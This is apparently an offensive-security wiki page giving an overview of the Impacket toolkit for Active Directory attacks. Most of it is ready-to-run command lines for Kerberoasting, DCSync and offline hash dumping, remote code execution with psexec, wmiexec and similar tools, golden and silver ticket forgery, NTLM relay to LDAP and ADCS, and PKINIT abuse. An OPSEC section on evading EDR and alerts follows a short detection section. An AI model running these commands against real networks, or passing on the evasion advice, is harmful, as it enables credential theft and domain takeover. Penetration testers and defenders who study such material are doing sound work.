---
title: Impacket toolkit overview
slug: impacket-toolkit-overview
aliases: [impacket, secretsdump, ntlmrelayx]
---

> **TL;DR:** Impacket is the Python AD attack swiss-army knife — pure MS-RPC/SMB/Kerberos implementations let you authenticate, relay, dump, execute, and forge tickets from Linux without ever touching a Windows host. Every OSCP/OSEP/CRTO walkthrough leans on it. Know the scripts by category and you can chain any AD attack from a single venv.

## Mental model

Impacket is **a library of MSRPC/SMB/LDAP/Kerberos implementations** plus a collection of scripts that drive those implementations to do useful offensive work. It is not a framework; it is a set of one-shots you compose. Two install paths:

```bash
# Stable
pipx install impacket
# Bleeding edge (fork with Kerberos extras, PKINIT, modern relay targets)
pipx install git+https://github.com/ThePorgs/impacket
```

`pipx` keeps `impacket-*` console scripts on PATH (or use `examples/*.py` from a clone). Modern distributions (Kali 2024+, Parrot) bundle ThePorgs fork because vanilla Impacket has lagged on PKINIT, ESC-* support, and SMBv2/3 signing nuance.

## Tradecraft — scripts by job

### Enumerate

```bash
GetUserSPNs.py corp.lab/me:'pw' -dc-ip 10.10.10.10 -request          # Kerberoast
GetNPUsers.py corp.lab/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass  # AS-REP roast
lookupsid.py corp.lab/me:'pw'@10.10.10.10 0                           # SID brute → user list
findDelegation.py corp.lab/me:'pw' -dc-ip 10.10.10.10                  # delegation graph
rpcdump.py @10.10.10.10                                                # MSRPC service map
```

### Credential dump

```bash
secretsdump.py -just-dc corp.lab/da:'pw'@dc                            # DCSync — krbtgt + all hashes
secretsdump.py -just-dc-user krbtgt corp.lab/da:'pw'@dc                # surgical DCSync
secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL        # offline hive dump
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL                     # offline NTDS dump
```

### Code execution

```bash
psexec.py corp.lab/da:'pw'@target           # noisy — service install
smbexec.py corp.lab/da:'pw'@target          # semi-interactive, no service binary
wmiexec.py corp.lab/da:'pw'@target          # WMI, no service
atexec.py corp.lab/da:'pw'@target 'cmd /c whoami'   # scheduled task
dcomexec.py -object ShellWindows corp.lab/da:'pw'@target   # DCOM activation
mssqlclient.py -windows-auth corp.lab/da:'pw'@sql   # MSSQL shell → xp_cmdshell
```

### Kerberos forgery & abuse

```bash
ticketer.py -nthash <krbtgt> -domain-sid <S-1-5-21-...> -domain corp.lab Administrator   # golden
ticketer.py -nthash <svc> -spn cifs/host.corp.lab -domain-sid ... -domain corp.lab user  # silver
getTGT.py corp.lab/me:'pw'                  # save .ccache
getST.py -spn cifs/dc.corp.lab corp.lab/me:'pw' -impersonate Administrator   # S4U2Self+Proxy
export KRB5CCNAME=$(pwd)/me.ccache && psexec.py -k -no-pass corp.lab/me@host
```

### Relay

```bash
ntlmrelayx.py -tf targets.txt -smb2support           # baseline NTLM relay
ntlmrelayx.py -t ldap://dc -smb2support --add-computer       # add a computer account → RBCD
ntlmrelayx.py -t http://adcs/certsrv/certfnsh.asp --adcs --template DomainController     # ESC8
ntlmrelayx.py -t ldaps://dc --shadow-credentials --shadow-target victim$ -smb2support   # ESC*-style
```

Coerce auth into the relay with [[petitpotam-coercion]], `coercer.py`, `dfscoerce.py`, `printerbug.py`, or `shadowcoerce.py`.

### PKINIT & cert auth

```bash
gettgtpkinit.py -cert-pfx user.pfx -pfx-pass '' corp.lab/user@dc user.ccache
getnthash.py -key <as-rep-key> corp.lab/user                 # UnPAC-the-hash
```

## Detection / Telemetry

- **`Impacket-` artefacts**: default service name `BTOBTO` (atexec), random 8-char service names with high entropy (psexec/smbexec), the literal `__output` SMB pipe (wmiexec/smbexec), and `cmd.exe /Q /c <cmd> 1> \\127.0.0.1\ADMIN$\__<rand> 2>&1`. Sigma rules covering these names catch a vanilla install.
- **MS-DRSR replication** from a non-DC source IP → DCSync. Alert on `4662` with `{1131f6aa-…}` ObjectAccess from a non-DC principal.
- **Kerberos PA-FOR-USER + S4U2Proxy** chains from non-service accounts → constrained delegation abuse via `getST.py`.
- **AS-REQ rc4 + RC4-HMAC** when AES is enabled tenant-wide → roasting via Impacket defaulting to RC4. ETW `Microsoft-Windows-Kerberos/Operational` 4768/4769 with `Ticket Encryption Type 0x17`.

## OPSEC pitfalls

- All Impacket execution scripts (psexec/smbexec/wmiexec/atexec) print **the same `__output` pipe pattern**. EDR signatures are cheap. Pair with a clean parent or rewrite the small parts you need into a BOF.
- Vanilla Impacket forces RC4 for AS-REQ even when accounts are AES-only — easy detection. ThePorgs fork added `-aes` for `GetUserSPNs.py`/`GetNPUsers.py`.
- `secretsdump.py -just-dc` triggers `DRSUAPI`; some environments alert on **any** DRS from non-DC source. Use `-use-vss` to read NTDS from a shadow copy (still noisy on disk) or pull `ntds.dit` via `wbadmin`/`ntdsutil` instead.
- Don't run `ntlmrelayx.py` and `responder` on the same interface unbound — port collisions on 445/139/80 silently break one of them. Either run `Responder` with `SMB = Off, HTTP = Off` or use `ntlmrelayx --no-smb-server --no-http-server`.
- Cleanup: `ntlmrelayx --add-computer` leaves a permanent computer account; track and `rpcclient -c 'deletecomputer <name$>'` after.

## References

- https://github.com/fortra/impacket
- https://github.com/ThePorgs/impacket
- https://www.thehacker.recipes/ad/movement/credentials/dumping/secretsdump
- https://github.com/SnaffCon/Snaffler (companion enumeration)
- https://attack.mitre.org/software/S0357/

See also: [[dcsync]], [[ntlm-relay]], [[kerberoasting]], [[asreproast]], [[constrained-delegation]], [[silver-tickets]], [[golden-tickets]], [[adcs-attacks]], [[netexec-nxc-workflow]], [[petitpotam-coercion]], [[dfscoerce]]
